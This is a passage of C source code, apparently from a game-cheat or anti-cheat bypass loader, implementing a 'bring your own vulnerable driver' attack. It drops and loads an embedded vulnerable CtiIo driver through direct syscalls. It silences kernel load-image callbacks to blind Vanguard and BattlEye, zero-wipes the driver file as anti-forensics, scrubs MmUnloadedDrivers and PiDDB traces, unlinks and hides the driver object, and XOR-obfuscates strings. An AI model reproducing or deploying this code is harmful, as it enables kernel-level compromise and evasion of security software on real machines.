        DEBUG_ERROR("DL: WriteFile failed, wrote %lu of %lu", w, sz);


        BYOVD_LogFmtErr("DL: WriteFile FAILED wrote=%lu expected=%lu err=%lu", w, sz, err);


        DeleteFileW(s_sysPath); goto _dal_end;


    }


    BYOVD_LogFmt("DL: driver written OK, %lu bytes", w);





    /* Create registry key for NtLoadDriver */


    WCHAR regPath[256];


    wsprintfW(regPath,L"SYSTEM\\CurrentControlSet\\Services\\%s",s_svcName);


    HKEY hK=NULL;


    if(RegCreateKeyExW(HKEY_LOCAL_MACHINE,regPath,0,NULL,0,KEY_ALL_ACCESS,NULL,&hK,NULL)!=ERROR_SUCCESS){


        DEBUG_ERROR("DL: RegCreateKeyExW failed, error=%lu", GetLastError());


        DeleteFileW(s_sysPath); goto _dal_end;


    }


    DWORD type1=1, start3=3, err0=0;


    WCHAR imgPath[MAX_PATH]; wsprintfW(imgPath,L"\\??\\%s",s_sysPath);


    RegSetValueExW(hK,L"ImagePath",0,REG_EXPAND_SZ,(BYTE*)imgPath,(DWORD)((wcslen(imgPath)+1)*2));


    RegSetValueExW(hK,L"Type",   0,REG_DWORD,(BYTE*)&type1,4);


    RegSetValueExW(hK,L"Start",  0,REG_DWORD,(BYTE*)&start3,4);


    RegSetValueExW(hK,L"ErrorControl",0,REG_DWORD,(BYTE*)&err0,4);


    RegCloseKey(hK);




    /* NtLoadDriver via direct syscall if available */


    tRtlIUS RtlIUS=(tRtlIUS)GetProcAddress(GetModuleHandleW(DXOR_W(ENC_ntdll_dll)), DXOR_A(ENC_RtlInitUnicodeString));


    if(RtlIUS){
        WCHAR ntSvc[256]; wsprintfW(ntSvc,L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s",s_svcName);
        BYOVD_US us; RtlIUS(&us,ntSvc);

        /* ── Pre-load: silence kernel load-image notify callbacks ─────────
         * Blinds Vanguard/BE kernel callbacks that receive the driver name and
         * base address the instant NtLoadDriver fires. Restored immediately after. */
        SilenceLoadImageCallbacks();

        NTSTATUS ns = SysNtLoadDriver(&us);

        /* ── Post-load: restore callbacks immediately ──────────────────── */
        RestoreLoadImageCallbacks();

        BYOVD_LogFmt("DL: NtLoadDriver NTSTATUS=0x%08X (%s)",
            ns,
            ns==0 ? "SUCCESS" :
            ns==(NTSTATUS)0xC0000022 ? "ACCESS_DENIED (sem SeLoadDriverPrivilege)" :
            ns==(NTSTATUS)0xC000010E ? "INVALID_IMAGE_FORMAT (driver nao assinado / SecureBoot / HVCI)" :
            ns==(NTSTATUS)0xC0000034 ? "OBJECT_NAME_NOT_FOUND (reg key sumiu)" :
            ns==(NTSTATUS)0xC0000428 ? "INVALID_IMAGE_HASH (DSE / HVCI bloqueou)" :
            ns==(NTSTATUS)0xC000035F ? "UNKNOWN_REVISION" :
            "outro erro");

        /* C0000035 = device already exists elsewhere; mark ok so caller can grab it */
        ok = (ns >= 0 || ns == (NTSTATUS)0xC0000035); /* NT_SUCCESS or already-loaded */
        if (!ok) DEBUG_ERROR("DL: NtLoadDriver failed with status 0x%08X", ns);

        /* ── Post-load: clean MmUnloadedDrivers immediately ───────────────
         * Also call here (not just at Shutdown) so that if the process is killed
         * abruptly before BYOVD_Shutdown(), the unloaded-driver trace is still
         * cleared while we have the driver loaded and CR3 valid. */
        if(ok) CleanMmUnloadedDrivers();

    } else {


        DEBUG_ERROR("DL: RtlInitUnicodeString not found");


        BYOVD_LogErr("DL: RtlInitUnicodeString NAO encontrado em ntdll");


    }





    /* Delete registry key and file immediately Ã¢â‚¬â€ driver stays in kernel RAM */


    RegDeleteTreeW(HKEY_LOCAL_MACHINE, regPath);

    /* Anti-forensic wipe: overwrite driver contents with zero bytes before unlinking */
    SetFileAttributesW(s_sysPath, FILE_ATTRIBUTE_NORMAL);
    HANDLE hFile = CreateFileW(s_sysPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize > 0 && fileSize != INVALID_FILE_SIZE) {
            BYTE zeroBuf[4096];
            SecureZeroMemory(zeroBuf, sizeof(zeroBuf));
            DWORD remaining = fileSize;
            DWORD written = 0;
            while (remaining > 0) {
                DWORD chunk = (remaining > sizeof(zeroBuf)) ? sizeof(zeroBuf) : remaining;
                WriteFile(hFile, zeroBuf, chunk, &written, NULL);
                remaining -= chunk;
            }
            FlushFileBuffers(hFile);
        }
        SysNtClose(hFile);
    }

    if (!DeleteFileW(s_sysPath)) {
        MoveFileExW(s_sysPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    }





_dal_end:
    VM_END


    return ok;


}





static void UnloadDriver(void){
    /* Close our handle but intentionally do NOT call NtUnloadDriver.
     * CtiIo64 does not call MmUnmapIoSpace in its DriverUnload, so physical
     * page mappings would be leaked in the kernel.  On next session startup,
     * TryOpenViaNtPath succeeds and VerifyCtiDevice passes — the driver is
     * reused without a new DropAndLoad, avoiding a double-MmMapIoSpace
     * MEMORY_MANAGEMENT (0x1A) BSOD when switching versions.
     * The driver is cleaned up by TryEvictSystemCtiIo on fresh installs or
     * by the OS on the next reboot. */
    if(s_hDev!=INVALID_HANDLE_VALUE){ SysNtClose(s_hDev); s_hDev=INVALID_HANDLE_VALUE; }
    BYOVD_Log("UnloadDriver: handle closed, driver left resident (no NtUnloadDriver).");
}





/* Ã¢â€â‚¬Ã¢â€â‚¬ Public API Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */


/* Evict whatever driver holds \Device\CtiIo.
 * Phase 1: registry search for services with "ctiio" in name/ImagePath.
 * Phase 2: scan drivers\ for stale .sys files matching our embedded resource
 *          size (previous loader run, registry key already deleted).
 *          Recreate a temp registry key so NtUnloadDriver can find it. */
static void TryEvictSystemCtiIo(void) {
    BYOVD_Log("Evict: starting");
    tRtlIUS RtlIUS = (tRtlIUS)GetProcAddress(GetModuleHandleW(DXOR_W(ENC_ntdll_dll)), DXOR_A(ENC_RtlInitUnicodeString));
    if (!RtlIUS) return;
    BOOL found = FALSE;

    /* ── Phase 1: registry search ─────────────────────────────────────────── */
    HKEY hSvcs;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services", 0, KEY_READ, &hSvcs) == 0) {
        WCHAR sub[256];
        for (DWORD idx = 0; !found && RegEnumKeyW(hSvcs, idx, sub, 256) == 0; idx++) {
            WCHAR low[256]; wcsncpy(low, sub, 255); low[255] = 0; _wcslwr(low);
            /* XOR-decoded "ctiio" for comparison */
            WCHAR _ev[6]; { static const UCHAR _ek[]={0x4E,0x59,0x44,0x44,0x42};
              for(int _k=0;_k<5;_k++) _ev[_k]=(WCHAR)(_ek[_k]^0x2Du); _ev[5]=0; }
            BOOL hit = (wcsstr(low, _ev) != NULL);
            if (!hit) {
                HKEY hK;
                if (RegOpenKeyExW(hSvcs, sub, 0, KEY_READ, &hK) == 0) {
                    WCHAR img[MAX_PATH] = {0}; DWORD sz = sizeof(img);
                    if (RegQueryValueExW(hK, L"ImagePath", NULL, NULL, (LPBYTE)img, &sz) == 0) {
                        _wcslwr(img);
                        if (wcsstr(img, _ev)) hit = TRUE;
                    }
                    RegCloseKey(hK);
                }
            }
            if (hit) {
                WCHAR ntSvc[256];
                wsprintfW(ntSvc, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", sub);
                BYOVD_US us; RtlIUS(&us, ntSvc);
                NTSTATUS ns = SysNtUnloadDriver(&us);
                BYOVD_LogFmt("TryEvict P1: svc=%ls ns=0x%08X", sub, ns);
                if (ns >= 0) { found = TRUE; SeraphSleep(500); }
            }
        }
        RegCloseKey(hSvcs);
    }

    /* ── Phase 2: stale GUID-named .sys from previous loader run ──────────── */
    if (!found) {
        HRSRC hR = FindResourceW(BYOVD_SELF_HMODULE, MAKEINTRESOURCEW(302), RT_RCDATA);
        DWORD resSize = hR ? SizeofResource(BYOVD_SELF_HMODULE, hR) : 0;
        if (resSize == 0) { BYOVD_Log("TryEvict P2: resource size unknown, skipping"); }
        else {
            BYOVD_LogFmt("TryEvict P2: scanning drivers\\ for %lu-byte .sys files", resSize);
            WIN32_FIND_DATAW fd;
            HANDLE hFind = FindFirstFileW(L"C:\\Windows\\System32\\drivers\\*.sys", &fd);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.nFileSizeHigh != 0 || fd.nFileSizeLow != resSize) continue;
                    WCHAR svc[256]; wcsncpy(svc, fd.cFileName, 255); svc[255] = 0;
                    WCHAR *dot = wcsrchr(svc, L'.'); if (dot) *dot = 0;
                    if (s_svcName[0] && _wcsicmp(svc, s_svcName) == 0) continue;

                    BYOVD_LogFmt("TryEvict P2: candidate %ls", fd.cFileName);
                    WCHAR regPath[512];
                    wsprintfW(regPath, L"SYSTEM\\CurrentControlSet\\Services\\%s", svc);
                    HKEY hKey;
                    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0,
                            KEY_WRITE, NULL, &hKey, NULL) == 0) {
                        DWORD dw = 1;
                        RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (LPBYTE)&dw, 4);
                        dw = 3;
                        RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (LPBYTE)&dw, 4);
                        WCHAR imgW[MAX_PATH];
                        wsprintfW(imgW, L"\\SystemRoot\\System32\\drivers\\%s", fd.cFileName);
                        RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
                            (LPBYTE)imgW, (DWORD)((wcslen(imgW)+1)*sizeof(WCHAR)));
                        RegCloseKey(hKey);

                        WCHAR ntSvc[256];
                        wsprintfW(ntSvc, L"\\Registry\\Machine\\%s", regPath);
                        BYOVD_US us; RtlIUS(&us, ntSvc);
                        NTSTATUS ns = SysNtUnloadDriver(&us);
                        BYOVD_LogFmt("TryEvict P2: unload %ls ns=0x%08X", svc, ns);
                        RegDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);
                        if (ns >= 0) { found = TRUE; SeraphSleep(500); break; }
                    }
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
        }
    }

    if (!found) BYOVD_LogErr("Evict: eviction failed");
}

/* Verify the open device actually maps distinct physical pages.
 * Reads PA 0x1000000 (16MB) and PA 0x3000000 (48MB) — well inside normal RAM.
 * 0x100000/0x200000 (1-2MB) are in the UEFI firmware region and can be identical.
 * If both reads succeed and pages differ, the driver is working correctly. */
static BOOL VerifyCtiDevice(void) {
    BYTE *a = (BYTE*)SeraphHeapAlloc(0x1000);
    if (!a) return FALSE;
    BOOL ok = CtiPhysRead(0x1000000ULL, a, 0x1000);
    if (!ok) BYOVD_LogFmtErr("VCD: FAILED IOCTL PA=0x1000000");
    else     BYOVD_Log("VCD: OK");
    SeraphHeapFree(a);
    return ok;
}

/* Open \Device\CtiIo directly via NtOpenFile (bypasses DosDevices symlink).


   Used when \\.\CtiIo fails but the device object is still live (e.g. the


   symlink was cleaned up but the device object is still resident). */


static HANDLE TryOpenViaNtPath(void) {
    /* \\Device\\CtiIo XOR-encoded (key=0x31) to avoid plaintext in .rdata */
    static const UCHAR enc[] = {0x13,0x0B,0x2A,0x39,0x26,0x2C,0x2A,0x13,0x0C,0x3B,0x26,0x06,0x20};
    WCHAR ntPath[14]; int i;
    for(i=0;i<13;i++) ntPath[i]=(WCHAR)(enc[i]^0x4Fu); ntPath[13]=0;
    BYOVD_US us = { (USHORT)(13*2), (USHORT)(14*2), ntPath };
    struct { ULONG Len; HANDLE Root; BYOVD_US* Name; ULONG Attr; PVOID SD; PVOID SQoS; }
        oa = { sizeof(oa), NULL, &us, 0x40, NULL, NULL };
    BYOVD_IOSB iosb = {0};
    HANDLE h = NULL;
    NTSTATUS ns = SysNtOpenFile(&h,
        GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE,
        (POBJECT_ATTRIBUTES)&oa, (PIO_STATUS_BLOCK)&iosb,
        FILE_SHARE_READ|FILE_SHARE_WRITE, 0x20);
    BYOVD_LogFmt("NtPath: ns=0x%08X h=%p", ns, h);
    if (ns < 0 || !h || h == INVALID_HANDLE_VALUE) return INVALID_HANDLE_VALUE;
    return h;
}


BOOL BYOVD_IsReady(void) {
    return s_hDev != INVALID_HANDLE_VALUE;
}

BOOL BYOVD_Init(void){
    BYOVD_Log("Init: START");
    if(s_hDev!=INVALID_HANDLE_VALUE){ BYOVD_Log("Init: already OK"); return TRUE; }

    /* Initialize the global driver lock (safe to call multiple times — guarded above) */
    BYOVD_LockInit();
    g_byovdDiagStep = 5; /* syscalls */


    InitSyscallNumbers();
    g_byovdDiagStep = 6; /* open-dev */





    /* Decode device name (XOR, key = 0x10 + i*5) => \\.\ CtiIo */


    /* \\.\\CtiIo XOR-encoded (key=0x13+i*7), 9 chars + null terminator */
    static const unsigned char s_enc[] = {0x4F,0x46,0x0F,0x74,0x6C,0x42,0x54,0x0D,0x24,0x52};


    wchar_t dev[16]; for(int i=0;i<10;i++) dev[i]=(wchar_t)(s_enc[i]^(0x13+i*7)); dev[10]=0;





    /* Use direct syscall path only — CreateFileW goes through IRP_MJ_CREATE
       which BattlEye's minifilter can intercept. TryOpenViaNtPath uses
       SysNtOpenFile (direct syscall) bypassing all user-mode hooks. */
    BYOVD_Log("Init: opening device");
    s_hDev = TryOpenViaNtPath();
    BYOVD_LogFmt("Init: TryOpenViaNtPath returned hDev=%p", (void*)s_hDev);


    /* Verify existing device maps distinct physical pages.
       A stale or system-installed CtiIo may return identical data for all PAs. */
    if(s_hDev != INVALID_HANDLE_VALUE && !VerifyCtiDevice()){
        BYOVD_LogErr("Init: resident device broken, forcing reload");
        SysNtClose(s_hDev);
        s_hDev = INVALID_HANDLE_VALUE;
        /* Enable SeLoadDriverPrivilege NOW — NtUnloadDriver inside TryEvict requires it.
         * Previously this was only done inside the if(s_hDev==INVALID) block that runs
         * AFTER eviction, causing every unload to fail with STATUS_PRIVILEGE_NOT_HELD. */
        { HANDLE _tok = NULL;
          NTSTATUS _st = SysNtOpenProcessToken(SERAPH_CURRENT_PROCESS, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &_tok);
          if (NT_SUCCESS(_st) && _tok) {
              TOKEN_PRIVILEGES _tp;
              _tp.PrivilegeCount = 1;
              _tp.Privileges[0].Luid.LowPart = 10; /* SeLoadDriverPrivilege LUID LowPart = 10 */
              _tp.Privileges[0].Luid.HighPart = 0;
              _tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
              NTSTATUS _adjSt = SysNtAdjustPrivilegesToken(_tok, FALSE, &_tp, sizeof(_tp), NULL, NULL);
              BYOVD_LogFmt("Init: SeLoadDriverPrivilege native adjust st=0x%08X", _adjSt);
              SysNtClose(_tok);
          } else { BYOVD_LogErr("Init: Native OpenProcessToken failed"); }
        }
        TryEvictSystemCtiIo();
    }


    if(s_hDev == INVALID_HANDLE_VALUE){


        /* Device not present or broken - need to load the driver */


        HANDLE tok = NULL;
        NTSTATUS st = SysNtOpenProcessToken(SERAPH_CURRENT_PROCESS, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok);
        if (NT_SUCCESS(st) && tok) {
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid.LowPart = 10; /* SeLoadDriverPrivilege LUID LowPart = 10 */
            tp.Privileges[0].Luid.HighPart = 0;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            SysNtAdjustPrivilegesToken(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
            SysNtClose(tok);
        }
        /* Evict any stale CtiIo instance from a previous session before loading a
         * fresh copy.  The CTI driver does NOT call MmUnmapIoSpace in DriverUnload,
         * so physical-page mappings leak across sessions.  Loading a new instance
         * that maps the same pages causes a MEMORY_MANAGEMENT (0x1A) BSOD.
         * TryEvictSystemCtiIo is a no-op if no previous instance is found.       */
        TryEvictSystemCtiIo();
        SeraphSleep(600);   /* allow kernel to finish eviction before load */

        g_byovdDiagStep = 7; /* load-drv */
        if(!DropAndLoad()) return FALSE;





        /* Open after load — direct syscall only */
        BYOVD_Log("Init: post-load opening");


        s_hDev = TryOpenViaNtPath();
        BYOVD_LogFmt("Init: post-load TryOpenViaNtPath returned hDev=%p", (void*)s_hDev);


        if(s_hDev == INVALID_HANDLE_VALUE){


            DWORD e = GetLastError();


            BYOVD_LogFmtErr("Init: open post-load FAILED err=%lu (0x%08lX)", e, e);


            UnloadDriver(); return FALSE;


        }


        BYOVD_Log("Init: device opened after load");
        if (!VerifyCtiDevice()) {
            BYOVD_LogErr("Init: post-load device still broken");
            SysNtClose(s_hDev); s_hDev = INVALID_HANDLE_VALUE;
            UnloadDriver(); return FALSE;
        }

    } else {


        BYOVD_Log("Init: device resident, verified OK");


    }





    g_byovdDiagStep = 8; /* find-eproc */
    BYOVD_Log("Init: calling FSE");
    s_sysEprocPA = FindSystemEproc();
    BYOVD_LogFmt("Init: FSE done epPA=0x%I64X CR3=0x%I64X", s_sysEprocPA, s_sysCR3);
    if(!s_sysEprocPA){
        SysNtClose(s_hDev); s_hDev=INVALID_HANDLE_VALUE;
        UnloadDriver(); return FALSE;
    }

    g_byovdDiagStep = 9; /* clean-pidb */
    BYOVD_Log("Init: calling PDB");

    /* Pre-resolve PspLoadImageNotifyRoutine array while we have the kernel
     * image mapped — this is used later by SilenceLoadImageCallbacks().
     * We do it here to amortize the Pk_MapPE cost across the init sequence. */
    {
        UINT64 kBase_siln;
        { char _nk_s[14]; _DecNtk(_nk_s); kBase_siln = Pk_ModBase(_nk_s); }
        if(kBase_siln) {
            WCHAR path_siln[MAX_PATH]; GetSystemDirectoryW(path_siln, MAX_PATH);
            { WCHAR _nkw_s[15]; _DecNtkW(_nkw_s); wcscat_s(path_siln, MAX_PATH, _nkw_s); }
            DWORD imgSz_siln = 0;
            BYTE *img_siln = Pk_MapPE(path_siln, &imgSz_siln);
            if(img_siln) {
                _FindPspLoadImageNotifyArray(img_siln, imgSz_siln, kBase_siln);
                SeraphVFree(img_siln);
            }
        }
    }

    CleanPiDDB();
    g_byovdDiagStep = 10; /* hide-drv */
    BYOVD_Log("Init: PDB done, calling HDR");
    HideByovdDriver();
    BYOVD_Log("Init: PsLoaded unlinked, calling HideDriverObject");
    HideDriverObject();

    /* Force synchronous initialization of physical RAM ranges on the main thread
     * to prevent DCL race conditions or CPU cached stale reads at runtime. */
    IsValidPhysAddr(0);

    BYOVD_Log("Init: HDR done, returning TRUE");
    return TRUE;
}


void BYOVD_Shutdown(void){


    CleanMmUnloadedDrivers(); /* remove unload trace before driver exits */


    UnloadDriver();


    s_sysCR3=0; s_sysEprocPA=0;


    InvalidateVAPACache();
    BYOVD_Log("Shutdown: zeroing caches");


    /* Secure-zero physical page cache — may contain sensitive kernel data */
    RtlSecureZeroMemory(s_pgc, sizeof(s_pgc));
    s_pgc_tick = 0;


    s_procNameCache[0]=0; s_procCR3Cache=0;

    BYOVD_Log("Shutdown: DONE");

    /* Destroy the global lock last — any access after this is UB.
     * Safe here because shutdown is called from main thread after all
     * worker threads have exited. */
    BYOVD_LockDestroy();
}





